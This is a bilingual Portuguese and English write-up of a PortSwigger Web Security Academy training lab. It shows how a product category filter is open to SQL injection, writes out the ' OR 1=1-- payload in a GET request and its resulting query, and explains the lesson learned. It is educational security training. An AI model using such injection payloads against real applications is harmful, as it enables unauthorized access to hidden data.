# Lab 01 — SQL Injection in WHERE Clause: Retrieving Hidden Data

> 🇧🇷 [Português](#-português) · 🇺🇸 [English](#-english)

---

## 🇧🇷 Português

**Plataforma:** PortSwigger Web Security Academy  
**Categoria:** SQL Injection  
**Dificuldade:** 🟢 Apprentice  
**Data:** 2026-06-06

### Descrição

O filtro de categorias de produtos é vulnerável a SQL injection. A query original restringe os resultados a produtos com `released = 1`. O objetivo é forçar a aplicação a exibir produtos ainda não lançados.

Query original:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

### Conceito

Quando um parâmetro de URL é concatenado diretamente em uma query SQL, o atacante pode injetar lógica própria para alterar o comportamento da consulta. Neste caso, basta fazer a condição `WHERE` sempre retornar verdadeiro — eliminando qualquer filtro que restrinja os resultados, incluindo o `released = 1`.

### Reconhecimento

Ao navegar pelas categorias, a URL seguia o padrão:

```
GET /filter?category=Gifts HTTP/1.1
```

O parâmetro `category` era diretamente controlável e refletido na query do banco.

### Exploração

A injeção `' OR 1=1--` faz com que a condição `WHERE` seja sempre verdadeira, e o `--` comenta o restante da query — incluindo o filtro `AND released = 1`:

```
GET /filter?category=Gifts'+OR+1=1-- HTTP/1.1
```

Query resultante:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

Todos os produtos, lançados ou não, foram retornados.

### O que aprendi

- `OR 1=1` é uma das injeções mais básicas — mas suficiente para derrubar qualquer filtro quando não há sanitização
- `--` comenta o resto da query no PostgreSQL/MSSQL, removendo condições de segurança como `released = 1`
- O parâmetro de categoria sendo refletido diretamente na query é o sinal claro de vulnerabilidade

### Referências

- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

## 🇺🇸 English

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** 🟢 Apprentice  
**Date:** 2026-06-06

### Description

The product category filter is vulnerable to SQL injection. The original query restricts results to products with `released = 1`. The goal is to force the application to display unreleased products.

Original query:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

### Concept

When a URL parameter is concatenated directly into a SQL query, the attacker can inject their own logic to alter the query's behavior. In this case, it's enough to make the `WHERE` condition always return true — eliminating any filter restricting results, including `released = 1`.

### Reconnaissance

Browsing the categories, the URL followed the pattern:

```
GET /filter?category=Gifts HTTP/1.1
```

The `category` parameter was directly controllable and reflected in the database query.

### Exploitation

The injection `' OR 1=1--` makes the `WHERE` condition always true, and `--` comments out the rest of the query — including the `AND released = 1` filter:

```
GET /filter?category=Gifts'+OR+1=1-- HTTP/1.1
```

Resulting query:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

All products, released or not, were returned.

### What I learned

- `OR 1=1` is one of the most basic injections — but enough to bypass any filter when there's no sanitization
- `--` comments out the rest of the query in PostgreSQL/MSSQL, removing security conditions like `released = 1`
- The category parameter being reflected directly in the query is the clear signal of vulnerability

### References

- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
